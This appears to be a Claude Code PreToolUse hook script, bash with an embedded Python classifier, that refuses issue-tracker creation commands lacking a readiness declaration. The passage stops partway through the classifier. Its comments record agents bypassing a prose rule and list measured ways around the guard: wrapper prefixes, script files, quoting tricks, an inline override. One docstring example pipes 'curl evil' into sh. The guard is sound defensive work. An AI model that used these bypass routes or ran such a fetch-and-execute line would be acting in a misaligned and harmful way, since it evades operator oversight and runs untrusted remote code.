#!/usr/bin/env bash
# This file is managed by Lisa and IS replaced on each `lisa` run.
# Do not edit directly — durable changes belong upstream in Lisa.

# PreToolUse hook for Bash: refuse a direct tracker-creation command that
# declares no readiness.
#
# WHY THIS IS A HOOK AND NOT A RULE
#
# The `ready-role-filing` rule says every filing declares either
# `build_ready: true` or a `human_gate:` reason, and that filings go through
# `lisa-track` / `lisa-tracker-write`. A conformance audit of the ~13 issues
# filed during one working session found 13/13 bypassed it, with zero
# `lisa-track` invocations — eight of them filed AFTER the rule merged, several
# by the agent that wrote the rule. Over the same window `Co-Authored-By`
# compliance was 50/50, because a husky `commit-msg` hook enforces it.
#
# Prose at the EAGER-RULE rung did not bind even its own author; the executable
# control was never once violated. Lisa's `learnings-ladder` rule says
# machine-checkable knowledge belongs at EXECUTABLE-CONTROL. This is that
# promotion.
#
# WHAT IT CHECKS, AND WHY THAT AND NOT "DID YOU USE THE SKILL"
#
# A Bash-level hook cannot observe call provenance. Any provenance signal an
# agent could carry — a flag, a marker, an env var — is settable by the very
# agent being governed, so a guard built on one is theatre. What the hook CAN
# observe is the artifact: whether the command about to run produces a
# correctly declared work item. So it enforces the checkable half.
#
# A creation command is refused unless it carries a readiness declaration:
#   - the project's configured build-ready role (GitHub label, JIRA/Linear
#     workflow state) resolved from `.lisa.config.json`, never hard-coded;
#   - on a tracker whose ready role is a STATE rather than a label, the
#     `lifecycle_role: ready` declaration the access layer resolves that state
#     from — because no flag on the mandated client can carry a state, and a
#     guard with no satisfiable declaration is a guard that teaches lying; or
#   - an explicit `[lisa-human-gate]` marker, inline or in the `--body-file`
#     the create is about to submit.
#
# WHERE IT LOOKS
#
# argv, the request payload (inline, in a `--data-binary @file`, or piped in
# over stdin from the same pipeline), and the contents of any file the command
# names. The last of those is what CodySwannGT/lisa#3484 was: the guard
# inspected argv and nothing else, so `bash /path/create.sh` showed it two
# tokens and the creation was one file away. Lisa's own `parity-safety-net.sh`
# tells agents to write payloads to a file and execute the file, so complying
# with Lisa's guidance produced the bypass.
#
# That is exactly the machine-checkable content of `ready-role-filing`, and it
# lets `lisa-github-write-issue` / `lisa-jira-write-ticket` /
# `lisa-linear-write-issue` through by construction, because those writers
# always stamp one. A blanket refusal would have blocked Lisa's own writers and
# left the factory unable to file anything.
#
# Creation signatures, per tracker CLI and the two ways around each:
#   gh issue create · gh api POST to .../issues · gh api graphql createIssue
#   linear issue create · jira issue create · acli … workitem/issue create
#   curl/http POST to api.github.com/…/issues, api.linear.app/graphql with
#   issueCreate, or …atlassian.net/rest/api/…/issue
# Reads never fire: `gh issue list`, `gh issue view`, `gh issue edit`,
# `gh pr create`, `gh label create`, a bare `gh api …/issues` GET, and a prose
# mention inside a quoted string are all allowed.
#
# STANDING DOWN
#
#   - No tracker configured (`.lisa.config.json` absent, or carrying no
#     `tracker`). There is no `lisa-tracker-write` to route through, so the
#     guard has nothing to redirect to. This is the bootstrapping case, and it
#     is DETECTED rather than asserted — the operator does not have to remember
#     an env var to bring up a new repo.
#   - `LISA_ALLOW_DIRECT_ISSUE_CREATE` non-empty in the hook's inherited
#     environment. This is the human operator's override, mirroring
#     `LISA_ALLOW_INSTRUCTION_FILE_WRITE`.
#
# The override is honored ONLY from the ambient environment, and is refused
# outright when it appears as an inline assignment in the intercepted command.
# That distinction is the whole point: a tool-call shell is fresh every time
# and its exports do not reach this hook's environment, so the ambient variable
# can only have been set by a human before the session started (shell profile,
# settings env block, CI config). An escape the governed agent reaches by
# typing one more token in front of the command it was just refused is not an
# escape hatch — it is the prose problem with extra steps.
set -euo pipefail

input="$(cat)"

# Probe both interpreters before use and announce a missing one rather than
# swallowing it. Under `set -e` an absent jq aborts with 127, and Claude Code
# treats any non-2 exit as a NON-BLOCKING hook error — so the guard would
# silently permit exactly what it exists to stop. Degrading to "allow" is
# right (a hook that cannot parse its input cannot tell a filing from a read),
# but doing it quietly is not: a guard that is silently absent reads exactly
# like a guard that is passing. Same reasoning as block-no-verify.sh.
for required in jq python3; do
  if ! command -v "$required" >/dev/null 2>&1; then
    printf 'block-direct-issue-create: %s not found; ready-role filing enforcement is NOT active\n' \
      "$required" >&2
    exit 0
  fi
done

tool_name="$(printf '%s' "$input" | jq -r '.tool_name // empty' 2>/dev/null || true)"
if [ "$tool_name" != "Bash" ]; then
  exit 0
fi

command_str="$(printf '%s' "$input" | jq -r '.tool_input.command // empty' 2>/dev/null || true)"
if [ -z "$command_str" ]; then
  exit 0
fi

project_dir="${CLAUDE_PROJECT_DIR:-}"
if [ -z "$project_dir" ]; then
  project_dir="$PWD"
fi

# Merged config, local overlay over base — the same precedence
# `lisa-tracker-read` / `lisa-tracker-write` resolve with, so the guard can
# never disagree with the writer about which tracker a project has.
read_config_value() {
  local filter="$1"
  local value=""
  local file
  for file in "$project_dir/.lisa.config.json" "$project_dir/.lisa.config.local.json"; do
    [ -f "$file" ] || continue
    local candidate
    candidate="$(jq -r "$filter // empty" "$file" 2>/dev/null || true)"
    [ -n "$candidate" ] && value="$candidate"
  done
  printf '%s' "$value"
}

tracker="$(read_config_value '.tracker')"
if [ -z "$tracker" ]; then
  exit 0
fi

# The build-ready role is read from config, never hard-coded: a project that
# renamed its ready lane must still be able to satisfy the guard, and the
# refusal has to name the token that project actually uses.
default_ready_role="status:ready"
case "$tracker" in
  github) ready_role="$(read_config_value '.github.labels.build.ready')" ;;
  jira) ready_role="$(read_config_value '.jira.workflow.ready')" ;;
  linear) ready_role="$(read_config_value '.linear.workflow.ready')" ;;
  *) ready_role="" ;;
esac
if [ -z "$ready_role" ]; then
  ready_role="$default_ready_role"
fi

# WHICH REPOSITORY'S VOCABULARY ANSWERS FOR THIS FILING
#
# The role above is the CALLING project's. For a same-repo filing that is the
# right question. For a filing addressed at a DIFFERENT repository — which
# Lisa ships a first-class, cron-driven path for in `lisa-persist-learning` —
# it is the wrong repository's vocabulary, and the guard demanded a token the
# target does not carry:
#
#   - a JIRA or Linear caller's ready role is a workflow STATE. Demanded as a
#     `gh --label` on another repo it is unsatisfiable, because that label does
#     not exist there and `gh` rejects an unknown one. Obeying the guard made
#     the command fail, which is not the same thing as being refused.
#   - a GitHub caller that renamed its ready lane demanded its own token of a
#     repository that never had it.
#   - a GitHub caller on the stock lane worked only because both repositories
#     happened to choose the same string. That is a coincidence, not routing.
#
# The one escape that IS satisfiable cross-repo, `[lisa-human-gate]`, is a lie
# about the item: it stamps a build-ready defect report as held for a human
# product call, and the target's build queue scans the ready role and nothing
# else. The report is filed and never picked up — precisely the incomplete
# handoff this guard exists to prevent, committed one repository over.
#
# So the target's own role answers, resolved from CONFIG rather than the
# network. A live `gh api repos/<o>/<r>/labels` lookup would be more general
# and is the wrong trade for a PreToolUse hook: a network round-trip on every
# intercepted command, and a new fail-open surface when it errors.
own_org="$(read_config_value '.github.org')"
own_name="$(read_config_value '.github.repo')"
own_repo=""
if [ -n "$own_org" ] && [ -n "$own_name" ]; then
  own_repo="$own_org/$own_name"
fi

# `hardening.upstreamRepo` already names the upstream repository across Lisa's
# filing skills; `hardening.upstreamReadyRole` is its sibling, so the guard
# keeps its existing discipline — read the role from config, never hard-code it
# — while reading it from the RIGHT repository's config.
upstream_repo="$(read_config_value '.hardening.upstreamRepo')"
if [ -z "$upstream_repo" ]; then
  upstream_repo="CodySwannGT/lisa"
fi
upstream_ready_role="$(read_config_value '.hardening.upstreamReadyRole')"
if [ -z "$upstream_ready_role" ]; then
  upstream_ready_role="$default_ready_role"
fi

# A non-GitHub caller's ready role is a workflow STATE, so it is never the right
# vocabulary for a GitHub target no matter what the target turns out to be. The
# classifier needs to know that even when this project declares no repo of its
# own to compare against.
caller_is_github="0"
if [ "$tracker" = "github" ]; then
  caller_is_github="1"
fi

# Ambient-only override. Deliberately read here, from the hook process's own
# environment, and never from the command being inspected.
ambient_override="${LISA_ALLOW_DIRECT_ISSUE_CREATE:-}"

# How to write the declaration down on THIS project's tracker. The answer is
# not the same everywhere, and printing the GitHub answer at a Linear operator
# is what made this guard unsatisfiable: it named a `--label` flag that the
# mandated client does not have, on a role that is not a label.
declaration_hint() {
  case "$tracker" in
    jira | linear)
      cat <<EOF
   Your build-ready role \`$ready_role\` is a workflow STATE, not a label, and
   the mandated client is \`curl\` — which has no flag that carries a state. So
   declare the LIFECYCLE ROLE the access layer resolves the state from, and let
   it do the resolving:

     LIFECYCLE_ROLE=ready curl -sS -X POST <the tracker endpoint> …

   or \`lifecycle_role:ready\` in the request payload, or a \`--state\` /
   \`--status\` flag where the CLI has one. The \`$tracker\` access layer takes
   that role, resolves it against the tracker's own state catalog, and fails
   CLOSED if it cannot — so the token is the input that decides the lane, not a
   decoration.
EOF
      ;;
    *)
      cat <<EOF
   The command has to carry the configured build-ready role \`$ready_role\` as
   the value of a \`--label\` / \`--status\` / \`--state\` flag — not in the
   title or body, because a role named in prose is not a role applied.
EOF
      ;;
  esac
}

refuse() {
  local signature="$1"
  local roles="$2"
  local target="$3"
  if [ -n "$target" ]; then
    refuse_cross_repo "$signature" "$roles" "$target"
  fi
  cat >&2 <<EOF
BLOCKED: refusing \`$signature\` — this filing declares no readiness.

WHY: a work item filed without the build-ready role is an incomplete handoff.
Build-intake scans the ready lane and nothing else, so nothing will ever pick
it up: the write succeeds and the work still dies. An audit of one working
session found 13 of 13 issues filed this way, none of them through Lisa's
filing path. The rule saying not to do this already existed — it did not bind,
so it is now enforced here.

FILE IT THE SANCTIONED WAY — one of these two, always explicit:

1. The item is complete enough to build. Use the filing flow, not the CLI:

     /lisa:track "<what needs building>"

   which resolves or creates exactly one live leaf through
   \`lisa-tracker-write\` with \`build_ready: true\`, validates it before the
   write, and claims it. Complete means the \`work-item-definition-of-ready\`
   bar — reproduction, observed-versus-expected, Gherkin acceptance criteria.

2. A human product call is genuinely pending. Route the same way but pass
   \`human_gate: "<why a human must judge this first>"\`, which stamps the hold
   so it is auditable rather than indistinguishable from an accident:

     Held for a human product call: <reason>.
     <!-- [lisa-human-gate] reason=<short-slug> -->

Filed, not ready, and no \`human_gate\` is the incomplete-handoff case, and
\`build_ready: false\` with no reason is the same omission with a value
attached. See the \`ready-role-filing\` rule for the full contract.

If you must run the CLI directly, the command has to carry one of the two
declarations itself:

$(declaration_hint)

   Or a \`[lisa-human-gate]\` marker in the body it submits, when a human
   product call really is pending.

WHERE THE DECLARATION IS READ FROM: argv, the request payload — inline, in a
\`--data-binary @file\`, or piped in over stdin — and the contents of a script
this command runs. Moving the create into a file no longer moves it out of
sight, so the declaration can live wherever the create does.

OPERATOR ESCAPE: a human can export \`LISA_ALLOW_DIRECT_ISSUE_CREATE=1\` in the
environment before starting the session. It is deliberately not reachable by
setting it inline on this command — an inline assignment is refused.
EOF
  exit 2
}

# The cross-repo refusal is a separate message, not a variable swapped into the
# one above, because its REMEDIATION is different. The local filing flow writes
# to this project's own tracker and structurally cannot reach another
# repository, so naming it here would send the agent to a path that cannot do
# the thing it was just refused for. Name the route that reaches the target,
# and name the target's role rather than this project's.
refuse_cross_repo() {
  local signature="$1"
  local roles="$2"
  local target="$3"
  cat >&2 <<EOF
BLOCKED: refusing \`$signature\` — this filing declares no readiness.

WHY: a work item filed without the build-ready role is an incomplete handoff.
Build-intake scans the ready lane and nothing else, so nothing will ever pick
it up: the write succeeds and the work still dies.

THIS FILING IS ADDRESSED AT ANOTHER REPOSITORY: \`$target\`.
That repository runs its own build queue off its own ready role, so this
project's role does not answer for it — and this project's filing flow writes
to this project's tracker, so it cannot reach the target at all.

FILE IT THE SANCTIONED WAY:

1. An upstream defect or hardening report — the highest-signal report there is,
   because it is reproduced and attributed rather than guessed at. Use the
   upstream filing path, which composes a redacted, public-safe body through an
   allowlist projection instead of free-form prose:

     bunx @codyswann/lisa file-upstream --input <filing-event>.json

   \`lisa-persist-learning\` step 6 runs exactly this, headless, on a cron, and
   files the result with explicit \`build_ready: true\` so the target's queue
   picks it up.

2. If you must run the CLI directly, the command has to carry the TARGET
   repository's build-ready role — \`$roles\` — as the value of a \`--label\`
   flag. Configure it as \`hardening.upstreamReadyRole\` when the target renamed
   its lane.

DO NOT reach for \`[lisa-human-gate]\` to get past this one. It still satisfies
the guard — it is a real declaration — but on an upstream defect report it is a
false one: it stamps the item as held for a human product call, and the
target's build queue scans the ready role and nothing else. The report is filed
and never picked up, which is the incomplete handoff this guard exists to
prevent, committed one repository over. Use it only when a human product call
is genuinely pending on the target.

OPERATOR ESCAPE: a human can export \`LISA_ALLOW_DIRECT_ISSUE_CREATE=1\` in the
environment before starting the session. It is deliberately not reachable by
setting it inline on this command — an inline assignment is refused.
EOF
  exit 2
}

# The classifier is read into a variable with a top-level here-document rather
# than piped straight in from inside `$( … )`. bash 3.2 — which is what macOS
# still ships as /bin/bash, and therefore what this fleet's hooks run under —
# mis-parses a here-document nested in a command substitution, scanning the
# document body for quotes and parentheses it should be treating as literal.
# The whole script then fails to parse, which is the worst possible failure for
# a guard: a syntax error exits non-zero, and Claude Code reads every non-2
# exit as a non-blocking hook error, so the command runs unchecked.
classifier=""
read -r -d '' classifier <<'PY' || true
import os
import re
import shlex
import sys

command = os.environ.get("LISA_GUARD_COMMAND", "")
ready_role = os.environ.get("LISA_GUARD_READY_ROLE", "")
ambient_override = os.environ.get("LISA_GUARD_AMBIENT_OVERRIDE", "")
default_ready_role = os.environ.get("LISA_GUARD_DEFAULT_READY_ROLE", "")
own_repo = os.environ.get("LISA_GUARD_OWN_REPO", "").strip().lower()
upstream_repo = os.environ.get("LISA_GUARD_UPSTREAM_REPO", "").strip().lower()
upstream_ready_role = os.environ.get("LISA_GUARD_UPSTREAM_READY_ROLE", "")
caller_is_github = os.environ.get("LISA_GUARD_CALLER_IS_GITHUB", "") == "1"
tracker = os.environ.get("LISA_GUARD_TRACKER", "").strip().lower()
project_dir = os.environ.get("LISA_GUARD_PROJECT_DIR", "")

OVERRIDE_NAME = "LISA_ALLOW_DIRECT_ISSUE_CREATE"
HUMAN_GATE_MARKER = "[lisa-human-gate]"

# ---------------------------------------------------------------------------
# WHY THIS IS A TOKEN SCAN AND NOT A PROGRAM RESOLVER
#
# The first version of this classifier asked "what program is being invoked?"
# and answered it by stripping a fixed allowlist of wrapper programs. That
# question is unbounded, so the allowlist could never be complete, and every
# gap failed OPEN: an unrecognised prefix became the resolved program,
# classification returned "not a creation", and the guard allowed. A
# branch-enumerating probe found 36 fail-opens, including `nice -n 10 gh issue
# create` — and `nice` is POSIX, present on every host, so one prepended token
# defeated the whole control end to end.
#
# Enumerating command SHAPES had scored 21/21 against that same code. The
# lesson is the method, not the list: probe the parser's decision points
# (tokenise, split, locate, classify, declare), not the attacks you can think
# of.
#
# So the question is inverted. Instead of "what program is this?" — unbounded —
# the classifier asks "does this command line invoke a tracker CLI in a
# creation mode?", which is bounded by a tracker list we already maintain.
# Every token is examined; anything before the CLI token is irrelevant by
# construction. `nice`, `stdbuf`, `caffeinate`, `xcrun`, `arch`, `script`,
# `timeout`, `env -i`, `sudo -u`, `xargs -I{}`, absolute paths, and every
# wrapper nobody has thought of yet all collapse into one code path.
#
# THE DEFAULT ANSWER TO "I DO NOT UNDERSTAND THIS" IS NOW REFUSE.
# Tokenisation failure, a nesting bound, an unparsed operand: each refuses with
# an explanation rather than passing. An operator who hits a false refusal says
# so and the recogniser widens; an agent who hits a false allow says nothing,
# which is the entire problem.
# ---------------------------------------------------------------------------

# Tracker CLIs. Bounded and reviewable, unlike the wrapper space.
TRACKER_CLIS = {"gh", "jira", "linear", "acli"}
HTTP_CLIS = {"curl", "http", "httpie", "wget"}

# Text that looks like a tracker creation even when it cannot be tokenised.
# Used ONLY on the tokenise-failure path, where the choice is between refusing
# and permitting something we demonstrably cannot read. Deliberately narrower
# than "mentions a tracker CLI" so an ordinary unparseable command
# (`echo 'it's fine`) still passes.
UNPARSEABLE_CREATION = re.compile(
    r"\b(?:gh|jira|linear)\b[^\n]*?\bissue\b[^\n]*?\bcreate\b"
    r"|\bacli\b[^\n]*?\b(?:workitem|issue)s?\b[^\n]*?\bcreate\b"
    r"|\bcreateIssue\b|\bissueCreate\b"
    r"|repos/[^/\s]+/[^/\s]+/issues"
    r"|atlassian\.net/rest/api/[^/\s]+/issue",
    re.IGNORECASE,
)

BODY_FILE_FLAGS = {"--body-file", "-F", "--input", "--data-binary"}
LABEL_FLAGS = {"--label", "--labels", "--add-label", "--status", "--state"}
POST_METHOD_FLAGS = {"-X", "--request", "--method"}
POST_PAYLOAD_FLAGS = {
    "-d", "--data", "--data-raw", "--data-binary",
    "-f", "-F", "--raw-field", "--field", "--input",
}
# Flags whose VALUE is a payload field. `-f path=repos/o/r/issues` must not be
# read as an endpoint: it is data being sent, not the address being posted to.
PAYLOAD_VALUE_FLAGS = {"-f", "-F", "--raw-field", "--field"}

# Matched against a token's PATH COMPONENT, never the raw argument — see
# `endpoint_path`. The `$` anchor is load-bearing and stays: without it
# `repos/o/r/issues/123/comments` reads as a creation, which is a different
# operation this guard must not refuse. The segment classes exclude `?` and
# `#` so the anchor cannot be reached past a decoration even if some future
# caller forgets to parse first.
GITHUB_ISSUES_PATH = re.compile(r"repos/[^/\s?#]+/[^/\s?#]+/issues/?$")
GITHUB_ISSUES_URL = re.compile(r"api\.github\.com/repos/[^/\s]+/[^/\s]+/issues")
# The repository a creation is ADDRESSED at, which decides whose ready role
# answers for it. `gh` accepts the flag before or after the subcommand and in
# either spelling, and the REST paths carry the same pair positionally.
REPO_FLAGS = {"--repo", "-R"}
GITHUB_ISSUES_PATH_REPO = re.compile(
    r"repos/([^/\s?#]+)/([^/\s?#]+)/issues/?$"
)
GITHUB_ISSUES_URL_REPO = re.compile(
    r"api\.github\.com/repos/([^/\s]+)/([^/\s]+)/issues"
)
JIRA_ISSUE_URL = re.compile(r"atlassian\.net/rest/api/[^/\s]+/issue")
GRAPHQL_CREATE = re.compile(r"createIssue|issueCreate")

# ---------------------------------------------------------------------------
# REACH: THE COMMAND IS NOT THE ONLY TEXT THAT RUNS
#
# The classifier above asks the right question of the wrong text. It examines
# argv, and argv is not where a creation has to live:
#
#   bash /tmp/create.sh          # URL and `issueCreate` both inside the script
#   node wrapper.mjs --state x   # same, in JavaScript
#   curl … --data-binary @p.json # URL in argv, mutation in the file
#
# All three ALLOWED, verified by driving the guard with synthetic payloads
# (CodySwannGT/lisa#3484). The detection is a CONJUNCTION — an endpoint token
# AND a creation verb in the SAME inspected command — so moving either half one
# file away means the conjunction never forms. `bash <path>` shows the
# classifier two tokens, neither of which is a tracker CLI.
#
# It is not an oversight that an operator had to be clever to find. Lisa's OWN
# guards instruct agents into this shape: `parity-safety-net.sh` refuses
# heredocs and says "write the payload to a file with the Write tool, then
# execute that file directly", and `block-shell-json-parsing.sh` pushes JSON
# construction into `jq` scripts. An agent complying perfectly with Lisa's
# guidance lands in the uninspected path BY DEFAULT. The guards were
# individually reasonable and jointly self-defeating.
#
# The fix follows this file's own inverted method. Enumerating interpreters —
# bash, sh, zsh, ksh, dash, python3, node, bun, deno, ruby, perl, `./script`,
# `source`, `env bash` — is the unbounded question all over again, and every
# gap in it fails OPEN. So the question is inverted the same way the wrapper
# question was: instead of "which programs execute their operands?", the
# classifier asks "does this command name a readable file whose CONTENTS read
# as an undeclared tracker creation?" — bounded by the tokens actually present.
#
# THE COST IS STATED, NOT HIDDEN. `cat create.sh` and `git add create.sh` are
# refused too, because proving that a program does NOT execute its operand
# requires exactly the allowlist this file already refuses to keep. That is the
# documented direction of failure: an operator who hits a false refusal says
# so, an agent who hits a false allow says nothing.
FILE_OPERAND_MAX_BYTES = 262144
FILE_OPERANDS_PER_SEGMENT = 8
# Payload sources. A creation's mutation text may arrive inline, from a file,
# or over stdin from an earlier stage of the same pipeline.
PAYLOAD_SOURCE_FLAGS = {
    "-d", "--data", "--data-raw", "--data-binary", "--data-ascii",
    "--data-urlencode", "--input", "-F", "--form", "--upload-file", "-T",
}
STDIN_PAYLOAD_TOKENS = {"-", "@-"}
# A tracker endpoint appearing anywhere in a file's text. Paired with
# GRAPHQL_CREATE as a CONJUNCTION, so an ordinary file that merely mentions
# `issueCreate` in prose — a changelog, a test name, a code comment — does not
# read as a creation on its own.
TRACKER_ENDPOINT = re.compile(
    r"api\.linear\.app/graphql"
    r"|api\.github\.com"
    r"|atlassian\.net/rest/api"
    r"|repos/[^/\s?#'\"]+/[^/\s?#'\"]+/issues",
    re.IGNORECASE,
)

# ---------------------------------------------------------------------------
# DECLARING BUILD-READY WHEN THE ROLE IS A STATE AND NOT A LABEL
#
# `declares_readiness` accepted the build-ready role only as the value of a
# LABEL_FLAGS flag in argv. That is well-formed for a LABEL-based tracker and
# structurally impossible for a STATE-based one:
#
#   - GitHub's ready role is a label, labels are argv-native (`--label`), so
#     `flag_values` finds it and an honest command exists.
#   - JIRA's and Linear's ready roles are workflow STATES. The mandated access
#     path is raw `curl` to a GraphQL/REST endpoint, `curl` has no `--state`
#     flag, and the state lives in the request payload as an ID the guard
#     cannot resolve without a network round-trip it refuses to make.
#
# So on a Linear-tracked project the only declaration left that passed was
# `[lisa-human-gate]`, which this file's own comments correctly forbid for a
# build-ready item: it stamps the item as held for a human product call, and
# build-intake scans the ready role and nothing else. An honest operator had NO
# compliant command and exactly one dishonest one — a guard failing in the
# harmful direction, where complying is worse than not.
#
# The declaration accepted here for state-based trackers is the LIFECYCLE ROLE
# the access layer already consumes. `lisa-linear-access` refuses to accept a
# caller-supplied `stateId`; it takes `lifecycle_role:<ROLE>`, resolves it
# against config and the team's own state catalog through
# `linear-state-write-target.mjs`, and fails CLOSED when it cannot. So the role
# token is not decoration: it is the input that decides which lane the item
# lands in, and a command carrying it either places the item in the ready lane
# or refuses. That is the same epistemic standing as `--label status:ready`,
# whose effect also happens one layer down inside `gh`.
#
# Scoped deliberately: accepted ONLY when the configured tracker's ready role
# is a state, and ONLY for a filing addressed at this project's own tracker. A
# GitHub filing — same-repo or cross-repo — still has to carry the label,
# because for GitHub the label IS expressible and a second, weaker spelling
# would be a hole rather than a remedy.
STATE_ROLE_TRACKERS = {"jira", "linear"}
#
# The optional quote AFTER the key name is load-bearing, not decoration. Both
# refusal messages tell the operator to put the declaration in the request
# payload, and a JSON payload quotes its keys — so a pattern demanding `[:=]`
# immediately after a bare key name refuses `"lifecycle_role": "ready"`, which
# is the exact spelling it just asked for. Caught by review before it shipped.
LIFECYCLE_ROLE_READY = re.compile(
    r"(?:^|[^\w.-])(?:lifecycle_role|LIFECYCLE_ROLE)[\"']?\s*[:=]\s*[\"']?ready\b"
    r"|(?:^|[^\w.-])--role[=\s]+[\"']?ready\b",
)
# Built per role at the point of use, because the role is project data. Kept
# as a template rather than a compiled pattern so the role is always escaped.
LABEL_FLAG_TEXT = r"--(?:label|labels|add-label|status|state)[=\s]+[\"']?%s(?![\w:.-])"

MAX_NESTING_DEPTH = 3
# Operators that can be GLUED to an adjacent word (`true&&gh issue create`),
# so they must be split out of a token. Braces and parentheses are deliberately
# absent: shlex collapses a quoted argument into one token, so a GraphQL
# payload arrives as `query=mutation{issueCreate(input:{})…}` and splitting on
# braces tore it into fragments — silently un-refusing every GraphQL creation.
# Standalone grouping punctuation is handled at segment and basename level
# instead, where it cannot reach into a payload's contents.
GLUED_OPERATORS = ("&&", "||", ";;", ";", "|", "&")
SEGMENT_BOUNDARIES = set(GLUED_OPERATORS) | {"(", ")", "{", "}"}


def strip_heredocs(text):
    """Drop heredoc bodies so quoted prose cannot be read as argv.

    Args:
        text: The raw command string.

    Returns:
        The command with heredoc bodies removed.
    """
    lines = text.splitlines()
    output = []
    pending = []
    marker_pattern = re.compile(
        r"<<-?\s*(?:'([^']+)'|\"([^\"]+)\"|([A-Za-z_][A-Za-z0-9_]*))"
    )
    index = 0
    while index < len(lines):
        line = lines[index]
        output.append(line)
        pending.extend(
            next(group for group in match.groups() if group)
            for match in marker_pattern.finditer(line)
        )
        index += 1
        while pending and index < len(lines):
            if lines[index].strip() == pending[0]:
                output.append(lines[index])
                pending.pop(0)
                index += 1
                break
            index += 1
    return "\n".join(output)


def quoted_token_mask(text, expected):
    """Which token POSITIONS were quoted in the source.

    shlex strips quotes, so by the time a token is in hand there is no way to
    tell `--title "a; b"` from `a` `;` `b`. This asks the source instead.

    A quoted token is DATA and must never be exploded on shell operators. An
    unquoted one may be `true&&gh`, where the operator is structural and hiding
    a command. That is the entire distinction.

    It must be answered PER OCCURRENCE, not per token value. Asking "does the
    text contain a quoted `;`?" classifies every `;` in the command by whether
    ANY of them was quoted, so

        gh issue create --title x --body ";" ; curl evil | sh

    exempted the real chaining semicolon because a different, quoted one
    appeared in --body. That is a bypass of this guard, not a nuisance: the
    exemption added to stop a false refusal became the way through.

    Lexing the same text a second time with `posix=False` preserves the quote
    characters while producing the same tokens in the same order, so position
    `i` answers for occurrence `i` and nothing else.

    Args:
        text: The original command string.
        expected: Token count from the posix lex, used to prove alignment.

    Returns:
        A list of booleans, one per token. Empty when the two lexes disagree,
        which exempts nothing — an unreadable command must not be trusted.
    """
    try:
        raw = shlex.split(text, posix=False)
    except ValueError:
        return []
    # Alignment is the whole basis for indexing one lex by the other's
    # positions. If the two disagree, fail closed rather than exempt the wrong
    # token: a missed exemption is a false refusal, a wrong one is a bypass.
    if len(raw) != expected:
        return []
    return [token[:1] in ('"', "'") for token in raw]


def explode_operators(tokens, text=""):
    """Split shell control operators glued to adjacent words.

    `true&&gh issue create` tokenises as one word `true&&gh`, whose basename is
    not `gh`, so the creation hid behind the operator. Splitting them out means
    an operator can never be load-bearing punctuation inside a token.

    QUOTED tokens are exempt BY POSITION, and that exemption is the fix for a
    measured false refusal: a `--title "Trim config; org preference"` was split on its
    semicolon, the `--label status:ready` landed in a different segment from the
    `gh issue create`, and the guard refused a correctly-formed filing while
    telling the author to add the label they had already added. Recorded on
    CodySwannGT/lisa#2634 after it blocked a real filing.

    `shlex.shlex(punctuation_chars=True)` is NOT the fix and was measured: it
    tokenises the glued case correctly but shatters a GraphQL payload —
    `query=mutation{issueCreate(input:{})}` becomes three fragments — which is
    the exact regression the GLUED_OPERATORS comment above records as having
    silently un-refused every GraphQL creation.

    Args:
        tokens: Tokens from shlex.
        text: The original command string, used to detect quoting.

    Returns:
        Tokens with operators separated out.
    """
    pattern = re.compile(
        "(" + "|".join(re.escape(op) for op in GLUED_OPERATORS) + ")"
    )
    exploded = []
    quoted = quoted_token_mask(text, len(tokens)) if text else []
    for index, token in enumerate(tokens):
        if index < len(quoted) and quoted[index]:
            exploded.append(token)
            continue
        for piece in pattern.split(token):
            if piece:
                exploded.append(piece)
    return exploded


def segment(tokens):
    """Split a token stream into individual commands at shell operators.

    Args:
        tokens: Exploded tokens.

    Returns:
        A list of argv lists.
    """
    segments = []
    current = []
    for token in tokens:
        if token in SEGMENT_BOUNDARIES:
            segments.append(current)
            current = []
            continue
        current.append(token)
    segments.append(current)
    return [item for item in segments if item]


def basename(token):
    """The final path component of a token, quotes stripped.

    Args:
        token: A shell token.

    Returns:
        The basename.
    """
    return token.strip("'\"").strip("(){}").rsplit("/", 1)[-1]


def is_flag_value(args, index):
    """Whether the token at `index` is the value of the preceding flag.

    This is the single position question the classifier keeps having to ask,
    and getting it wrong is what produced three separate bypasses: the role
    read from a `--title`, the role read past `--`, and a subcommand read as a
    flag's value. It is answered in exactly one place now.

    Args:
        args: A command's arguments.
        index: The position to test.

    Returns:
        True when the previous token is a flag that carries no `=`.
    """
    if index == 0:
        return False
    previous = args[index - 1]
    return previous.startswith("-") and previous != "-" and "=" not in previous


def bare_index(args, word, start=0):
    """Index of `word` appearing as itself rather than as a flag's value.

    Args:
        args: A command's arguments.
        word: The word to locate.
        start: Index to search from.

    Returns:
        The index, or -1.
    """
    for index in range(start, len(args)):
        if args[index] == word and not is_flag_value(args, index):
            return index
    return -1


def invokes_verb(args, groups, verb):
    """Whether a group word is followed later by a bare verb.

    Deliberately tolerant of anything between them, because a flag may sit
    between the group and the verb — `gh issue --repo o/r create` is accepted
    by cobra, which strips persistent flags before resolving the subcommand.
    Tolerance is safe here only because the verb itself must be bare: that is
    what keeps `gh issue list --search create` from reading as a creation.

    Args:
        args: A command's arguments.
        groups: Acceptable group words, e.g. {"issue", "workitem"}.
        verb: The verb, e.g. "create".

    Returns:
        True when the invocation names the verb.
    """
    # The bare-token filter is applied to the VERB only, never to the group
    # word, and the asymmetry is the point. `--verbose` is boolean, so treating
    # the token after any flag as that flag's value swallowed `api` in
    # `gh --verbose api …` and `issue` in `gh --verbose issue create`. Being
    # permissive about the group costs nothing, because the verb still has to
    # match; being permissive about the VERB is what would read
    # `gh issue list --search create` as a creation. Over-include where the
    # consequence is another check, filter where the consequence is a refusal.
    for group in groups:
        if group not in args:
            continue
        group_at = args.index(group)
        if bare_index(args, verb, group_at + 1) >= 0:
            return True
    return False


def is_write_request(args):
    """Whether the arguments describe an HTTP write rather than a read.

    Args:
        args: A command's arguments.

    Returns:
        True if a POST method or a payload-bearing flag is present.
    """
    for index, token in enumerate(args):
        if token in POST_METHOD_FLAGS:
            if index + 1 < len(args) and args[index + 1].upper() == "POST":
                return True
        if "=" in token:
            head, value = token.split("=", 1)
            if head in POST_METHOD_FLAGS and value.upper() == "POST":
                return True
        if token.upper() == "-XPOST":
            return True
        if token in POST_PAYLOAD_FLAGS:
            return True
    return False


def endpoint_path(token):
    """The path component of an endpoint-shaped argument.

    An endpoint is a URL, and a URL is not its path: `?query` and `#fragment`
    are separate components that address the SAME resource. Comparing the raw
    argument against a path pattern therefore recognised a URL SHAPE rather
    than an endpoint, and `repos/o/r/issues?foo=1` — the identical request —
    was classified as a non-creation and allowed (#2939).

    Trailing whitespace is stripped for the same reason: `"repos/o/r/issues "`
    survives shlex as one token and addresses the same endpoint, but defeats an
    end-anchored comparison just as a query string does.

    Args:
